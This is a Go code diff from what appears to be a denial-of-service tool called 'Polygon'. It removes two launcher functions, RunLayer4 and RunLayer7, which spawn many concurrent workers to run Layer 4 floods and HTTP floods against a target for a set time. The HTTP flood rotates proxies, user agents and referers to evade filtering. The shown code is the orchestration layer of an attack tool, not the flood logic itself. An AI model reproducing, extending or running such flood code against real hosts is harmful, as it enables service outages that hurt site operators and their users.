@@ -5,11 +5,9 @@ package core
 import (
 	"context"
 	"log"
-	"net"
 	"sync"
 	"time"
 
-	"Polygon/attack"
 	"Polygon/proxy"
 	"Polygon/stats"
 	"Polygon/tools"
@@ -22,6 +20,7 @@ type WorkerFunc func(ctx context.Context)
 type Engine struct {
 	mu      sync.Mutex
 	workers []context.CancelFunc
+	cfg     engineConfig
 }
 
 // Spawn starts n goroutines running fn, all sharing a child of ctx.
@@ -69,53 +68,6 @@ type Layer7Config struct {
 	Proxies    []proxy.Proxy
 	Threads    int
 	Duration   time.Duration
-}
-
-// RunLayer4 launches a Layer 4 attack with live stats reporting.
-func RunLayer4(cfg Layer4Config) {
-	localIPStr, _ := tools.LocalIP()
-	localIP := net.ParseIP(localIPStr)
-
-	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
-	defer cancel()
-
-	engine := &Engine{}
-	engine.Spawn(ctx, cfg.Threads, func(ctx context.Context) {
-		l4 := &attack.Layer4{
-			Target:     cfg.Target,
-			Port:       cfg.Port,
-			Method:     cfg.Method,
-			Refs:       cfg.Refs,
-			Proxies:    cfg.Proxies,
-			ProtocolID: cfg.ProtocolID,
-			LocalIP:    localIP,
-		}
-		l4.Run(ctx)
-	})
-
-	statsLoop(ctx, cfg.Target, cfg.Method, int(cfg.Duration.Seconds()))
-}
-
-// RunLayer7 launches a Layer 7 attack with live stats reporting.
-func RunLayer7(cfg Layer7Config) {
-	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
-	defer cancel()
-
-	engine := &Engine{}
-	engine.Spawn(ctx, cfg.Threads, func(ctx context.Context) {
-		flood := &attack.HttpFlood{
-			TargetURL:  cfg.TargetURL,
-			Host:       cfg.Host,
-			Method:     cfg.Method,
-			RPC:        cfg.RPC,
-			UserAgents: cfg.UserAgents,
-			Referers:   cfg.Referers,
-			Proxies:    cfg.Proxies,
-		}
-		flood.Run(ctx)
-	})
-
-	statsLoop(ctx, cfg.TargetURL, cfg.Method, int(cfg.Duration.Seconds()))
 }
 
 func statsLoop(ctx context.Context, target, method string, totalSec int) {
